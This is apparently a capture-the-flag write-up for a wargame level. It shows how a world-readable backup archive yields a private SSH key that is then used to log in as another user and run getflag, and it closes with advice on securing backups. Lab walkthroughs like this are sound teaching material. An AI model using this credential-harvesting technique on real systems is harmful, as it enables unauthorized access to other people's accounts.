### 🧭 Challenge Objective

> In this level, you're asked to inspect the `flag05` home directory and spot a case of **weak file permissions**.  
> These misconfigurations expose sensitive backup data, which you can leverage to gain access.

**Login:** `level05 : level05`  
**Target:** `/home/flag05/.backup`

---

### 🧮 Directory Enumeration

Let’s begin by listing the contents:

```bash
ls -la /home/flag05
```

✅ Output:

```
drwxr-xr-x  2 flag05 flag05   42 Nov 20  2011 .backup
```

The `.backup` folder is **world-readable**, which is already suspicious.

---

### 📦 Digging into the Backup

Check inside `.backup`:

```bash
ls -la /home/flag05/.backup
```

✅ Output:

```
-rw-rw-r-- 1 flag05 flag05 1826 Nov 20  2011 backup-19072011.tgz
```

Unpack the archive:

```bash
tar -xvf /home/flag05/.backup/backup-19072011.tgz -C /tmp/
```

Inside the extracted files, we discover:

```bash
/tmp/.ssh/id_rsa
```

This is a **private SSH key**, likely belonging to `flag05`.

---

### 🔑 Exploitation: Logging in via SSH Key

Use the extracted key to log in as `flag05`:

```bash
ssh -i /tmp/.ssh/id_rsa flag05@localhost
```

You should now have shell access as `flag05`.

---

### 🏁 Grab the Flag

Once inside:

```bash
getflag
```

✅ Output:

```
You have successfully executed getflag on a target account
```

### 🔐 What We Learned

This level emphasizes the **critical importance of permission hygiene**, especially with archived backups. Exposing sensitive credentials — even in backup files — can be just as dangerous as leaking them directly.

💡 **Security Tip:**

> Always secure backup files. Limit directory access, encrypt sensitive contents, and never leave SSH keys or secrets unprotected in readable archives.
